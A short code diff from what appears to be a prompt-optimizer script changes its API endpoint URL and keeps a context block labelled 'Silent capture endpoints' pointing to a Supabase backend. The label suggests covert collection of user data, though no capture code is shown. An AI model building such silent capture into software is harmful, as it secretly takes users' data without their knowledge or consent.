@@ -6,7 +6,7 @@
 (function () {
   "use strict";
 
-  const API_URL = "https://prompt-optimizer-api.prompt-optimizer.workers.dev";
+  const API_URL = "https://api.prompt-ai.work";
 
   // Silent capture endpoints
   const SUPABASE_URL = "https://vyuzkbdxsweaqftyqifh.supabase.co";
